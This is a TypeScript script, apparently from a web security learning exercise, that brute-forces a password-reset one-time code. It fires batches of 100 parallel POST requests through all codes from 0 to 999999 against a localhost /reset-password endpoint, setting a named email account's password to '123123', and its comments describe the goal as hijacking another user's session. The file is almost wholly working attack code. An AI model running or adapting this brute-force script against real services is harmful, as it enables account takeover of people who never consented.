import express from 'express';
import axios  from 'axios';
//from this server we will try to hijack the session of another user
//that is when the otp is generated
//we can do something like send request for random otps until the otp is true
//first we go to postman and hit the route to behijacked then we take the nodejs axios code from it  

async function sendRequest(otp:string) { //this is an async function , and when we return an async function it returens a promise
    let data = JSON.stringify({
        "email": "dassrinjoy333@gmail.com",
        "otp": otp,
        "newPassword": "123123"
    });

    let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { 
        'Content-Type': 'application/json'
    },
    data : data
    };
    
    try {
        await axios.request(config);
    } catch (error) {
        //console.log(error);
    }
}

//batching --> 100 at a time request will go --> 100 requests complete then the 100 will go , what it helps is the memory stack will not run out of memory
async function main(){
    for(let i = 0 ; i <= 999999 ; i=i+100){//fist i requests will go out 
        const p = [];
        console.log(i);
        for(let j = 0 ; j < 100 ; j++){
            //console.log(i+j);
            //sneding the 100 requests
            p.push(sendRequest((i+j).toString())); //we are putting the async requests to a array p
        }
        await Promise.all(p); //so we are telling the requests to go parallely and when all succeds then we will continue to the next 100 batch
    }
}

main();

